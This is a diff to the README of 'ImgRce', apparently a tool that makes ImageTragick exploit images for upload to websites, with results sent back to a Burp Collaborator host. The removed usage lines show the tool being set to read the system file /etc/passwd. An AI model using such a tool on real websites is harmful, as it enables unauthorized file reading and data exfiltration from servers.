@@ -16,16 +16,4 @@ Python 2.7
 ImgRce is for Image Tragick Exploit using Burp Collaborator. ImgRce Create the Image file you just upload the file on website. you will get the response in your burp Collaborator.
 
 ## Usage:
-python imgrce.py
-Enter the Burp Collaborator Link> adsfhgfahgfdsaghhafd.net
-
-0 for Exit
-1 for Ping
-2 For System File
-
-select the option> 2    
-Enter the system file name> /etc/passwd     
-
-Exploit Created!.. visit the Collaborator                                                     
- 
- 
+![use](https://user-images.githubusercontent.com/29841053/63261518-54d0bd00-c2a1-11e9-85f3-12fc99514a35.png)
